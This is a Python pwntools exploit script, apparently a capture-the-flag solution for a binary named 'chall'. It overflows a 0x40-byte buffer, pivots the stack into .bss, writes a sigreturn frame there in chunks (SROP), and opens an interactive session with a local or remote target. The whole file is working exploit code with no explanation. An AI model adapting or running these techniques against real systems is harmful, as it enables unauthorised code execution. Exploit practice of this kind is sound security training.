#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chall")

gs = """
b *0x40102D
"""


frame = SigreturnFrame()
frame.rax = 0x0
frame.rdi = 0
frame.rsi = frame.rsp = frame.rbp = e.bss(0x100)
frame.rdx = 0x2000
frame.rip = 0x40102A


frame = bytes(frame)


def start():
    if args.LOCAL:
        p = process(["./run"])

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.send(
    b'A'*0x40 +
    p64(e.bss(0x100)) +
    p64(0x401017)
)

pause()

p.send(
    frame[:0x40] +
    p64(e.bss(0xc0+0x40*2)) +
    p64(0x401017)
)

pause()

p.send(
    frame[0x40:0x80] +
    p64(e.bss(0xc0+0x40*3)) +
    p64(0x401017)
)

pause()

p.send(
    frame[0x80:0xc0] +
    p64(e.bss(0xc0+0x40*4)) +
    p64(0x401017)
)

if args.GDB:
    gdb.attach(p.pid+1, gdbscript=gs)
    pause()

p.send(
    frame[0xc0:].ljust(0x40) +
    p64(e.bss(0xc0+0x40*5)) +
    p64(0x401017)
)

pause()

p.send(
    b'A'*0x40 +
    p64(e.bss(0xc0-0x40+0x38-0x10)) +
    p64(0x401017)
)

pause()

p.interactive()
